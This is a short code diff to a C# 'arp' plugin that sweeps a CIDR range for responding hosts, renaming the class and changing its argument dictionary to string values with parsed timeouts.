@@ -5,7 +5,7 @@ using System.Text;
 
 namespace Plugins
 {
-    public class Plugin : AthenaPlugin
+    public class Arp : AthenaPlugin
     {
         public override string Name => "arp";
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
@@ -63,13 +63,13 @@ namespace Plugins
             }
             Thread.Sleep(timeout);
         }
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
             try
             {
                 IPNetwork ipnetwork = IPNetwork.Parse((string)args["cidr"]);
                 IPAddressCollection iac = ipnetwork.ListIPAddress();
-                int timeout = (int)args["timeout"];
+                int timeout = int.Parse(args["timeout"]);
 
                 CheckStatus(iac, timeout * 1000, (string)args["task-id"]);
                 PluginHandler.Write("Finished Executing", (string)args["task-id"], true);
